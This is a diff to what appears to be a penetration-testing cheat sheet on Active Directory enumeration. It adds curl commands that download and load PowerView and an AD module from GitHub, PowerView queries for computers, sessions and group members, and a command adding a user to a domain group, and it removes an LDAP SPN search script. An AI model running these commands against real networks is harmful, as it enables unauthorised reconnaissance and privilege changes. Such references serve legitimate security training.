@@ -1,12 +1,6 @@
-
-
 ## Active Directory
 ### Enumeration
 
--> Enumerates all local accounts
-```
-net user
-```
 
 -> Enumerate all users in the entire domain
 ```
@@ -23,9 +17,43 @@ net user <user> /domain
 net group /domain
 ```
 
+-> Get members of local group
+```
+Get-NetLocalGroup -ComputerName <domain> -Recurse (PowerView)
+```
+
 -> Find out domain controller hostname
 ```
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+```
+
+-> Configure ActiveDirectory Module - RSAT
+```
+curl https://raw.githubusercontent.com/samratashok/ADModule/master/ActiveDirectory/ActiveDirectory.psd1 -o ActiveDirectory.psd1  
+curl https://github.com/samratashok/ADModule/blob/master/Microsoft.ActiveDirectory.Management.dll?raw=true -o Microsoft.ActiveDirectory.Management.dll  
+Import-Module .\Microsoft.ActiveDirectory.Management.dll  
+Import-Module .\ActiveDirectory.psd1  
+```
+
+-> Configure PowerView Module
+```
+curl https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 -o PowerView.ps1
+. .\PowerView.ps1
+```
+-> Last logon
+```
+Get-LastLoggedOn -ComputerName <domain>
+```
+
+-> List Computers
+```
+Get-NetComputer (PowerView)
+```
+
+-> Add domain user to a domain group
+```
+Add-DomainGroupMember -Identity 'SQLManagers' -Members 'examed'
+Get-NetGroupMember -GroupName 'SQLManagers'
 ```
 
 -> Enumeration script for all AD users, along with all properties for those user accounts.
@@ -77,39 +105,6 @@ Get-NetSession -ComputerName dc1
 ```
 
 #### Enumeration Through Service Principal Names
--> PowerShell enumeration script to filter the serviceprincipalname property to the string *http*
-```
-$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-
-$PDC = ($domainObj.PdcRoleOwner).Name
-
-$SearchString = "LDAP://"
-$SearchString += $PDC + "/"
-
-$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
-
-$SearchString += $DistinguishedName
-
-$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
-
-$objDomain = New-Object System.DirectoryServices.DirectoryEntry
-
-$Searcher.SearchRoot = $objDomain
-
-$Searcher.filter="serviceprincipalname=*http*"
-
-$Result = $Searcher.FindAll()
-
-Foreach($obj in $Result)
-{
-    Foreach($prop in $obj.Properties)
-    {
-        $prop
-    }
-}
-```
-
-or
 
 https://raw.githubusercontent.com/compwiz32/PowerShell/master/Get-SPN.ps1
 
